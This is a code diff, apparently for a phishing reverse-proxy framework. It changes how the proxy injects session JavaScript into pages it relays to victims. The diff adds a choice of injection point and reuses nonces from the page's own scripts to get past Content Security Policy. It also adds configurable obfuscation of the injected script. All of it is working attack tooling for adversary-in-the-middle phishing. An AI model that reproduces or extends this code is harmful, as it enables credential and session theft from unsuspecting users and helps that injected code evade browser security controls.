@@ -1290,13 +1290,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								js_params = &s.Params
 							}
 							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
-							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
+							js_id, js_location, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							if err == nil {
-								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
+								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id), js_location)
 							}
 
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
-							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
+							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id), "body_bottom")
 						}
 					}
 				}
@@ -1444,24 +1444,56 @@ func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Re
 	return req, nil
 }
 
-func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
+// injectJavascriptIntoBody injects JavaScript using HTML parser (Pro 4.2 feature)
+// Supports injection locations: head, body_top, body_bottom
+func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string, location string) []byte {
+	// Check if body has HTML structure
+	if !HasHTMLStructure(body) {
+		log.Debug("js_inject: content is not HTML, skipping injection")
+		return body
+	}
+
+	// Extract nonce from existing scripts for CSP compatibility
 	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
 	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
 	js_nonce := ""
 	if m_nonce != nil {
 		js_nonce = " nonce=\"" + m_nonce[1] + "\""
 	}
-	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
-	var d_inject string
+
+	// Build script content
+	var scriptContent string
 	if script != "" {
-		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
+		// Apply JS obfuscation based on config level
+		obfLevel := p.cfg.GetJsObfuscationLevel()
+		script = ObfuscateJavaScript(script, obfLevel)
+		scriptContent = "<script" + js_nonce + ">" + script + "</script>"
 	} else if src_url != "" {
-		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
+		scriptContent = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>"
 	} else {
 		return body
 	}
-	ret := []byte(re.ReplaceAllString(string(body), d_inject))
-	return ret
+
+	// Use default location if not specified
+	if location == "" {
+		location = "body_bottom"
+	}
+
+	// Inject using HTML parser
+	result, err := InjectJavaScriptHTML(body, scriptContent, location)
+	if err != nil {
+		// Fallback to regex-based injection if HTML parsing fails
+		log.Debug("js_inject: HTML parser failed (%v), falling back to regex", err)
+		re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
+		d_inject := scriptContent + "\n${1}"
+		return []byte(re.ReplaceAllString(string(body), d_inject))
+	}
+
+	if p.cfg.GetDebugMode() {
+		log.Debug("js_inject: injected script at location '%s' (obfuscation: %s)", location, p.cfg.GetJsObfuscationLevel())
+	}
+
+	return result
 }
 
 func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
